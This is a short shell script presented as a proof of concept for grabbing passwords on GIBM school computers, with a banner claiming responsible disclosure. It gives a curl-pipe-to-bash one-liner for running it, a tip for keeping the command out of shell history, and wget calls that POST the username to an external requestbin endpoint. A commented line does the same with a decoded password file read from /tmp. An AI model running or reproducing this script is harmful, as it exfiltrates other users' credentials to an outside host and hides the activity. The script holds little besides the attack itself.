###-------------------------------------------------------------------------------------------------------------------------###
### DISCLAIMER: THIS IS A POC DEMONSTRATING WHY YOU SHOULD NOT USE ANY IMPORTANT CREDENTIALS TO LOG INTO YOUR GIBM COMPUTER ###
###          DEVELOPERS ASSUME NO LIABILITY FOR ANY DAMAGE OR ACTION THE USER CAUSES BY RUNNING THIS SCRIPT                 ###
###                                  YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS!                                              ###
###                                                                                                                         ###
###        RESPONSIBLE DISCLOSURE: THIS VULNERABILITY HAS BEEN REPORTED TO THE GIBMIT PRINCIPAL ON 06/02/2017               ###
###                                           NO FIX PROVIDED YET                                                           ###
###-------------------------------------------------------------------------------------------------------------------------###


# Download an execute oneliner:
# curl -sSL https://raw.githubusercontent.com/DanielRamp/SecurityAtGIBMIT/master/pw_grabber_poc.sh | bash


# or
# Make runable (chmod +x pw_grabber_poc.sh)
# Run with [space] ./pw_grabber_poc.sh (space before cmd doesn't save to history)

REQUESTBIN=https://enwm0jstbopwp.x.pipedream.net

wget -O- --post-data $(whoami) $REQUESTBIN &> /dev/null
#wget -O- --post-data $(cat /tmp/password-store-$USER | base64 -d) $REQUESTBIN &> /dev/null
#wget -O- --post-data $(date +"%Y-%m-%d-%H-%M-%S") $REQUESTBIN &> /dev/null
